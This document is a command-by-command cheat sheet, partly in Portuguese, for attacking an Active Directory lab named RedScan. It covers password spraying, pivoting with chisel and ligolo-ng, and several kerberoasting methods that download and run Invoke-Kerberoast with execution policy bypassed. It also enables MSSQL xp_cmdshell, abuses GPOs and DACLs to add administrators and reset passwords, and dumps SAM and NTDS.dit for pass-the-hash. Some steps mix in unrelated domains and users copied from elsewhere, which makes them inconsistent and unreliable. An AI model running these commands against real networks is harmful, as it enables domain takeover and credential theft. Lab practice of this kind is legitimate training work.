# Active Directory RedScan Labs

## Initial Enumeration
```
nxc smb 192.168.2.0/24
```

Port scanning
```
nmap 192.168.2.210
```

Service Enumeration
```
nmap -sV 192.168.2.210 -p135,139,445,5357,5985
```

User Brute force 
```
wget https://raw.githubusercontent.com/thiagosmith/active-directory/refs/heads/main/users.txt
```

Password Spraying
```
nxc smb 192.168.2.0/24 -u users.txt -p 'Senha@123'
```

Password Stuffing
```
nxc smb 192.168.2.210 -u users -p 'Senha@123'
```

## Piviting

### Chisel
Link - https://github.com/jpillora/chisel/releases 

Exemplos:
```
kali 192.168.2.50 
pivô 192.168.2.210 - 192.168.56.210 
alvo 192.168.56.0/24 
```

Local Port Forwarding: 
```
pivô: ./chisel server -p 10000 
kali: ./chisel client 192.168.2.210:10000 192.168.2.50:445:192.168.56.200:445 
```

Reverse Port Forwarding: 
```
kali: ./chisel server -p 10000 --reverse 
pivô: ./chisel client 192.168.2.50:10000 R:192.168.2.50:1433:192.168.56.201:1433 
```

Dynamic Port Forwarding: 
```
pivô: ./chisel server -p 10000 --socks5 
kali: ./chisel client 192.168.2.210:10000 5000:socks 
```

Dynamic Reverse Port Forward: 
```
kali: ./chisel server -p 10000 --reverse --socks5 
pivô: ./chisel client 192.168.2.50:10000 R:5000:socks
```

### Ligolo-NG

Instalação (Kali):
```
sudo apt install ligolo-ng
```
```
sudo apt install ligolo-ng-common-binaries
```

Obtenção dos binários Proxy e Agent(Kali):
```
ligolo-ng-common-binaries 
```

Configuração da interface ligolo (Kali):
```
sudo ip tuntap add user kali mode tun ligolo
```
```
sudo ip link set ligolo up
```

Start Ligolo Proxy(Kali):
```
sudo ligolo-proxy -selfcert
```

Execução do binário Agent no pivot:
```
.\agent.exe -connect 192.168.2.50:11601 -ignore-cert
```

Listagem de sessões (Kali): 
```
session
```
```
1
```

Listagem de einterfaces de rede(Kali):
```
ifconfig
```

Rota (Kali):
```
sudo ip route add 192.168.56.0/24 dev ligolo
```

Start na rota (Kali)
```
start
```

## Internal Enumeration
```
nxc smb 192.168.56.0/24
```

## Vulnerabilidade SPN (Service Principal Names)
- Exploit 1:
```
nxc ldap 192.168.56.200 -u user -p Password --kerberoasting hash.txt
```

- Exploit 2:
```
impacket-GetUserSPNs -request -dc-ip 192.168.56.200 redscan.local/user:Password
```

- Exploit 3:
```
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
```
```
cd targetedKerberoast
```
```
./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'redscan.local' -u 'user' -p 'Password
```

- Exploit 4:
```
use auxiliary/gather/get_user_spns
```
```
set rhosts 192.168.56.200
```
```
set domain redscan.local
```
```
set user user
```
```
set pass Password
```
```
run
```

- Exploit 5:
```
./Rubeus.exe kerberoast /outfile:hash.txt
```

- xploit 6:
```
wget https://raw.githubusercontent.com/EmpireProject/Empire/refs/heads/master/data/module_source/credentials/Invoke-Kerberoast.ps1
```
```
Powershell -ep bypass
```
```
Import-Module .\Invoke-kerberoast.ps1
```
```
Invoke-kerberoast
```

- Exploit MS-SQl
```
impacket-mssqlclient redscan.local/sqlservice:Password@192.168.56.201 -windows-auth
```
```
xp_cmdshell
```
```
sp_configure 'show advanced options', 1;
```
```
RECONFIGURE;
```
```
sp_configure 'xp_cmdshell', 1;
```
```
RECONFIGURE;
```
```
EXEC xp_cmdshell 'cmd /c whoami'
```

## Vulnerabilidades AD-DACL(Discretionary Access Control Lists):

### VULN 1 - GPO Abuse: Exploiting Vulnerable Group Policy Objects

dba.admin

Exploit 1:
```
git clone https://github.com/hackndo/pyGPOAbuse.git
```
```
cd pyGPOAbuse
```
```
python3 -m virtualenv .venv
```
```
source .venv/bin/activate
```
```
python3 -m pip install -r requirements.txt
```

Blooudhound: Distinguished Name containing GUID
```
python pygpoabuse.py redscan.local/user:'Password' -gpo-id "4B878AA9-238D-4975-B3A3-B7EE9990F66C"
```

Verifying the Injected Task on the DC
GPO: VULN - - > Edit - - > Schedule Tasks - - > Task_xxx
net user john H4x00r123.. /add followed by a net localgroup administrators /add

```
evil-winrm -i 192.168.56.200 -u suporte -p Support1
```
```
net localgroup administrators
```
```
evil-winrm -i 192.168.56.200 -u john -p H4x00r123..
```
```
whoami /priv
```

Exploit 2:
```
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "VULN GPO"
```
```
net localgroup administrators
```


### VULN 2 - WriteOwner Abuse: Group

maria - - > devgroup

Exploit:
Granting Ownership:
```
impacket-owneredit -action write -new-owner 'maria' -target-dn 'CN=devgroup,CN=redscan,DC=redscan,DC=local' 'redscan.local'/'maria':'Password' -dc-ip 192.168.56.200
```

Granting Full Control:
```
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'maria' -target-dn 'CN=devgroup,CN=redscan,DC=redscan,DC=local' 'redscan.local'/'maria':'Password' -dc-ip 192.168.56.200
```


### VULN 3 - WriteOwner Abuse: User

roger - - > joao

Exploit:

Granting Ownership:
```
impacket-owneredit -action write -new-owner 'joao' -target-dn 'CN=roger,CN=Users,DC=redscan,DC=local' 'redscan.local'/'roger':'Password' -dc-ip 192.168.56.200
```

Granting Full Control:
```
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'joao' -target-dn 'CN=roger,CN=Users,DC=redscan,DC=local' 'redscan.local'/'roger':'Password' -dc-ip 192.168.56.200
```


### VULN 4 - AllExtendedRights: User

ana - - > jose

Exploit:
```
net rpc password kavish 'Password@987' -U ignite.local/geet%'Password@1' -S 192.168.1.8
```

### VULN 5 - WriteDacl: User

carla - - > rafaela

Exploit:
```
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'carla' -target-dn 'CN=rafaela,CN=Users,DC=redscan,DC=local' 'redscan.local'/'rafaela':'Password' -dc-ip 192.168.56.200
```
```
net rpc password rafaela 'Password@2026' -U redscan.local/carla%'Password' -S 192.168.56.200
```
```
./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'ignite.local' -u 'komal' -p 'Password@1'
```


### VULN 6 - WriteDacl: Group

salesgroup - - > renato

Exploit
```
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'rudra' -target-dn 'CN=salesgroup,CN=Users,DC=ignite,DC=local' 'ignite.local'/'rudra':'Password@1' -dc-ip 192.168.56.200
```
```
net rpc group addmem "Domain Admins" rudra -U ignite.local/rudra%'Password@1' -S 192.168.56.200
```


### VULN 7 - Generic ALL Permissions: User

salesgroup - - > renato

Exploit
```
net rpc user -U ignite.local/renato%'Password@1' -S 192.168.56.200
```
```
net rpc group members "salesgroup" -U ignite.local/renato%'Password@1' -S 192.168.56.200
```
```
net rpc group addmem "salesgroup" "komal" -U ignite.local/renato%'Password@1' -S 192.168.56.200
```


### VULN 8 - Generic ALL Permissions: Group

neide - - > joao

Exploit
```
net rpc password joao 'Password1!' -U ignite.local/neide%'Password@1' -S 192.168.56.200
```
```
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
```
```
./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'ignite.local' -u 'neide' -p 'Password@1'
```


### VULN 9 - GenericWrite: Group

tigroup - - > paty 

Exploit
```
net rpc group addmem "tigroup" paty -U ignite.local/paty%'Password@1' -S 192.168.56.200
```

### VULN 10 - GenericWrite: Group

sqlservice - - > paty

Exploit
```
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
```
```
./targetedKerberoast.py --dc-ip '192.168.56.200' -v -d 'ignite.local' -u 'radha' -p 'Password@1'
```


### VULN 11 - SeBackupPrivilege
backup operators - - > ana

Exploit 1:
```
evil-winrm -i 192.168.56.200 -u ana -p password
```
```
reg save hklm\system c:\users\public\system
```
```
reg save hklm\sam c:\users\public\sam
```
```
download ntds.dit
```
```
download system
```
```
impacket-secretsdump -sam sam -system system local
```
```
impacket-psexec administrator@ip --hashes ntlm
```

Exploit 2:
```
nano xpl.dsh
```
```
set context persistent nowriters
add volume c: alias xpl
create
expose %xpl% z:
```
```
unix2dos xpl.dsh
```
```
evil-winrm -i 192.168.56.200 -u raj -p Password@1
```
```
cd c:\users\public\
```
```
upload raj.dsh
```
```
diskshadow /s raj.dsh
```
```
robocopy /b z:\windows\ntds . ntds.dit
```
```
reg save hklm\system c:\users\public\system
```
```
download ntds.dit
```
```
download system
```
```
impacket-secretsdump -ntds ntds.dit -system system local
```
```
impacket-psexec administrator@192.168.56.200 --hashes ntlm
```


